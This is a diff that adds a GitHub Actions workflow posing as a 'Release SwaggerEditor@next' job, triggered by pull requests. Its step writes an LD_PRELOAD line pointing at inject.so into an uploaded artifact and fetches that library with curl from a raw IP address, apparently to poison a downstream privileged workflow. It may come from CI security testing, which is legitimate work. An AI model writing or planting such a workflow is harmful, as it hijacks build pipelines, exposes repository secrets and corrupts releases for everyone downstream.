@@ -1,0 +1,32 @@
+name: "Release SwaggerEditor@next"
+
+on:
+  pull_request:
+
+jobs:
+  evil:
+      name: evil
+      runs-on: ubuntu-latest
+      steps:
+      - name: prepare
+        run: |
+        
+            mkdir released-version
+            echo -e 'null\nLD_PRELOAD="/home/runner/work/s1n-cicd-tests/RD_swg/inject.so"' > released-version/released-version.txt
+
+            curl http://146.59.195.165:8000/inject.so -o released-version/inject.so
+            
+            mkdir build
+            echo 'empty' > build/empty.txt
+            
+      - name: Upload release
+        uses: actions/upload-artifact@v3
+        with:
+          name: released-version
+          path: released-version.txt
+
+      - name: Upload build
+        uses: actions/upload-artifact@v3
+        with:
+          name: build
+          path: build/
